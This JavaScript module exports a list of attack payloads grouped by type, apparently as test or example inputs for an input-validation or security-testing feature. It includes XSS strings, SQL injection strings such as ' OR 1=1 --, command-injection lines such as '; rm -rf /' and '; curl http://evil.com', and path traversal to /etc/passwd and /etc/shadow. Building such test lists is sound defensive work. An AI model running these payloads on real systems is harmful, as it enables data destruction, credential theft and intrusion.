const dangerGroups = [
  {
    category: 'XSS 공격',
    items: [
      '<script>',
      'javascript:alert(1)',
      '<img src=x onerror=alert(1)>',
      '<iframe>',
      '<svg onload=alert(1)>',
      '<body onload=alert(1)>',
      '<details open ontoggle=alert(1)>',
      '<link rel=import href="javascript:alert(1)">',
    ],
  },
  {
    category: 'SQL 인젝션',
    items: [
      `' OR 1=1 --`,
      'UNION SELECT *',
      'drop table users',
      `" OR "" = "`,
      "admin'--",
      `' OR 'a'='a'`,
      `'; shutdown --`,
      `' OR 1=1 LIMIT 1`,
    ],
  },
  {
    category: '특수문자 / 위험 패턴',
    items: [
      '< > \' "',
      '&{}[]',
      '@#$%^&*~',
      '\\..\\',
      '${7*7}',
      '${{7*7}}',
      '%0A',
      '%3Cscript%3E',
    ],
  },
  {
    category: 'Command Injection',
    items: [
      '; rm -rf /',
      '| cat /etc/passwd',
      '&& whoami',
      '$(ls)',
      '`ls`',
      '; curl http://evil.com',
    ],
  },
  {
    category: 'Directory Traversal',
    items: [
      '../../../../etc/passwd',
      '..%2f..%2fetc/passwd',
      '/etc/shadow',
      'C:\\Windows\\System32',
      '../config/database.yml',
    ],
  },
]

export default dangerGroups
